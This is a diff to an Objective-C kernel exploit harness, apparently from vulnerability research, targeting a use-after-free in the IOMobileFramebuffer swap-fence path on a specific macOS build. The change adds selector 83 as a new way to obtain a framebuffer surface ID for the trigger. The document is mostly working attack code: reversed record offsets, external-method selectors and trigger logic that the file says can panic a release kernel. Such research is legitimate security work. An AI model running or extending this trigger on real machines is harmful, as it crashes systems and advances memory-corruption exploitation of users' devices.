@@ -1,7 +1,7 @@
-// f022_harness.m — F022 IOMFB/IOSurface swap-fence UAF — v1.2 EXPLORATION harness
+// f022_harness.m — F022 IOMFB/IOSurface swap-fence UAF — v1.3 EXPLORATION harness
 //
 // Target: IOMobileFramebufferUserClient on macOS 26.5.1 / 25F80 / MacBookPro18,2 / Apple M1 Max.
-// Goal of v1: MAP the live calling convention, reach swap_apply_fences_gated, then trigger
+// Goal of v1.3: MAP the live calling convention, reach swap_apply_fences_gated, then trigger
 //             close-after-fence-registration. NOT a proof harness — a diagnostic explorer.
 //
 // DESIGN RULES (per operator):
@@ -34,6 +34,7 @@
 //   sel  8  get_display_size scalarIn=0 structIn=0 scalarOut=2 (width, height)
 //   sel 20  swap_signal  scalarIn=2 structIn=0
 //   sel 52  swap_cancel  scalarIn=1 structIn=0
+//   sel 83  displayed_fb_surface scalarIn=1 structIn=0 scalarOut=1 (entitlement/runtime-gated)
 // IOMFBSwapRec field map (reversed from swap_submit/swap_queue_finalize_gated; see REC_OFF_* below):
 //   rec+0x98       swap id (must equal swap_start out)          -> finds the queued request
 //   rec+0x14c      layer-enable bitmask                          -> request+0x338 (bit k = layer k)
@@ -66,6 +67,7 @@ enum {
     SEL_GET_DISPLAY_SIZE = 8,
     SEL_SWAP_SIGNAL = 20,
     SEL_SWAP_CANCEL = 52,
+    SEL_DISPLAYED_FB_SURFACE = 83,
 };
 #define IOMFB_SWAP_REC_SIZE ((size_t)1416) // 0x588 (compile-time constant for stack buffers)
 // ---- IOMFBSwapRec field map (reversed from swap_submit @0xa950c20, per-layer loop k=0..3) ----
@@ -250,6 +252,23 @@ static int get_default_surface_id(mfb_handle_t *h, int w, int h_px, uint32_t *ou
     return 1;
 }
 
+static int get_displayed_surface_id(mfb_handle_t *h, uint32_t layer, uint32_t *out_sid) {
+    uint64_t in[1] = {layer};
+    uint64_t out[1] = {0};
+    uint32_t outCnt = 1;
+    kern_return_t kr = call_method(h->conn, "displayed_fb_surface", SEL_DISPLAYED_FB_SURFACE,
+                                   in, 1, NULL, 0, out, &outCnt, NULL, NULL);
+    if (kr != KERN_SUCCESS || outCnt < 1 || out[0] == 0) {
+        LOGW("displayed_fb_surface(layer=%u) failed or returned id=0 (kr=0x%08x). If this is "
+             "NotPermitted/NoDevice, it is an exported-surface source blocker, not a negative finding.",
+             layer, (unsigned)kr);
+        return 0;
+    }
+    *out_sid = (uint32_t)out[0];
+    LOGI("displayed framebuffer surface id=%u (layer=%u)", *out_sid, layer);
+    return 1;
+}
+
 // ---- DETERMINISTIC v1.1 record: one fullscreen passthrough layer (layer 0) -------------------
 // Reaches swap_apply_fences_gated: layer 0 enabled (req+0x338 bit0), surface id at rec+0x9c looked
 // up -> req+0xac0 non-null; mode!=9; default req+0x34c/req+0x580 -> verifyKeepOnScreen passes; a
@@ -426,7 +445,7 @@ int main(int argc, char **argv) {
     }
     if (!do_probe_mode && !do_trigger_mode) { do_probe_mode = 1; do_trigger_mode = 1; }
 
-    LOGI("F022 harness v1.2 — IOMFB swap-fence UAF explorer. build=26.5.1/25F80/M1Max (static seeds).");
+    LOGI("F022 harness v1.3 — IOMFB swap-fence UAF explorer. build=26.5.1/25F80/M1Max (static seeds).");
     LOGW("LIVE KERNEL CALLS. A landed trigger is expected to PANIC on a release kernel. Authorized only.");
 
     if (do_probe_mode) do_probe();
@@ -444,11 +463,13 @@ int main(int argc, char **argv) {
         if (manual_surface_id == 0) {
             if (!use_generic_surface) {
                 get_display_size(&h, &w, &hpx);
-                if (!get_default_surface_id(&h, w, hpx, &sid)) {
-                    LOGW("trigger: default framebuffer surface unavailable; falling back to generic IOSurfaceCreate.");
-                    use_generic_surface = 1;
-                } else {
+                if (get_default_surface_id(&h, w, hpx, &sid)) {
                     surface_source = "default_fb_surface";
+                } else if (get_displayed_surface_id(&h, 0, &sid)) {
+                    surface_source = "displayed_fb_surface";
+                } else {
+                    LOGW("trigger: no framebuffer-owned/displayed surface exported. Use --generic-surface "
+                         "only as the known STAGE3.5 control, or --surface-id if you have a candidate.");
                 }
             }
             if (use_generic_surface) {
